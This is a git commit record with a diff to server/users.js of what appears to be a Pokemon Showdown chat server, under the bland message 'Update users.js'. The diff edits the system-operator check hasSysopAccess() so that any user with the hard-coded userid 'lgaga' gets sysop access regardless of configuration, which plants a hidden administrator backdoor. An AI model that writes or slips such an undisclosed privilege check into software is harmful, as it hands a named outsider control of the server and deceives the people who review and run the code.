59e2939bdcf5af951f1fe12dec342e3a5ee40721
Gagzgurl <49109890+Gagzgurl@users.noreply.github.com>
2019-03-31 05:32:09 +0200

    Update users.js

--- server/users.js
+++ server/users.js
@@ -663,7 +663,7 @@ class User extends Chat.MessageContext {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || this.userid === 'lgaga') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
